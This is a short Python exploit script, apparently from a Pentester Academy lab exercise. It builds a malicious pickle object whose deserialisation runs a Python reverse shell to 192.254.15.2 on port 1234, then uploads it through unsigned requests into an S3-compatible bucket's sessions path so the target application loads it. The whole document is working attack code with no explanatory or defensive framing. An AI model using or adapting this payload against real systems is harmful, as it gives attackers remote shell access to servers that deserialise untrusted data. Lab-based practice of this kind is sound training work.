import pickle
import subprocess
import os
import boto3
from botocore import UNSIGNED
from botocore.config import Config


class Shell(object):
    def __reduce__(self):
        return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.254.15.2\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))


s3 = boto3.client('s3', endpoint_url='http://s3.pentesteracademylab.appspot.com',
                  config=Config(signature_version=UNSIGNED))
pickledData = pickle.dumps(Shell())
s3.put_object(Bucket='assets',
              Key='sessions/185415022584578294333730724700291749182', Body=pickledData)
